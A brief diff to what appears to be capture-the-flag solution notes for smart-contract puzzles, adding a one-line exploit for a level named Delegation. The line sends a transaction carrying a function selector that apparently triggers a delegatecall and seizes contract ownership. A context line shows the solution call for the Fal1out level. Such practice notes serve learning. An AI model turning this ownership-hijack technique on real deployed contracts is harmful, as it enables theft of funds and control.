@@ -43,5 +43,8 @@ contract.Fal1out.sendTransaction({from: player, value: toWei("0.00001")})
 
 ---
 #7. Delegation
+```
+contract.sendTransaction({from: player, to: this, value:0, data: "0xdd365b8b" })
+```
 
 ---
